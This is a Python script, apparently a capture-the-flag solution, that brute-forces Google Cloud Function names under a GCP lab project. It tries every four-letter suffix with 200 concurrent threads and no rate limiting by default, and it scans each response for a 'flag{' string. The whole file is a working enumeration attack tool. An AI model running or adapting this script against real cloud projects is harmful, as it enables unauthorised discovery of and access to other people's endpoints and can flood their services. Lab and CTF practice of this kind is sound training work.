import itertools
import string
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

#######################################
# Configuration
#######################################
PREFIX = "cloudfunction-lab-1-gcp-labs-0atempep-"
CHARSET = string.ascii_lowercase
SUFFIX_LENGTH = 4
BASE_URL = "https://us-central1-gcp-labs-0atempep.cloudfunctions.net"
CONCURRENCY = 200
RATE_LIMIT_DELAY = 0.0  # Increase if rate-limited
#######################################

def extract_flag_from_response(text):
    """
    Extract the flag from the HTTP response text.
    Adjust the logic based on how the flag is represented in the response.
    """
    if "flag{" in text.lower():
        start = text.lower().find("flag{")
        end = text.find("}", start)
        if end != -1:
            return text[start:end+1]
    return None

def test_function(name):
    """
    Test the function by calling its HTTP endpoint.
    If the function exists and returns the flag, return (name, flag).
    Otherwise, return (None, None).
    """
    url = f"{BASE_URL}/{name}"
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            flag = extract_flag_from_response(r.text)
            if flag:
                return name, flag
            else:
                # Function reachable but no flag found in response
                return name, None
        else:
            # Non-200 likely means function doesn't exist or no permission
            return None, None
    except requests.RequestException:
        return None, None

def main():
    suffixes = ["".join(s) for s in itertools.product(CHARSET, repeat=SUFFIX_LENGTH)]
    total = len(suffixes)
    sys.stdout.write(f"[INFO] Starting brute force enumeration... {total} combinations.\n")

    found_flag = False
    attempts = 0

    with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        future_to_suffix = {
            executor.submit(test_function, PREFIX + suffix): suffix
            for suffix in suffixes
        }

        for future in as_completed(future_to_suffix):
            attempts += 1
            suffix = future_to_suffix[future]
            try:
                name, flag = future.result()
                if name is not None:
                    # We found a reachable function
                    sys.stdout.write(f"[INFO] Found function: {name}\n")
                    if flag:
                        sys.stdout.write(f"[SUCCESS] Flag found: {flag}\n")
                        found_flag = True
                        break
                    else:
                        # We found the function but no flag. Could stop or continue.
                        # Here, let's continue in case there's multiple matches.
                        pass
            except Exception as e:
                sys.stderr.write(f"[ERROR] Unexpected error testing '{suffix}': {e}\n")

            # Optional rate limiting
            if RATE_LIMIT_DELAY > 0:
                time.sleep(RATE_LIMIT_DELAY)

    if not found_flag:
        sys.stdout.write("[INFO] Brute-force complete. No function or flag found.\n")
    else:
        # If we found the flag, we can stop here.
        sys.stdout.write("[INFO] Stopping brute force as flag has been found.\n")

if __name__ == "__main__":
    main()

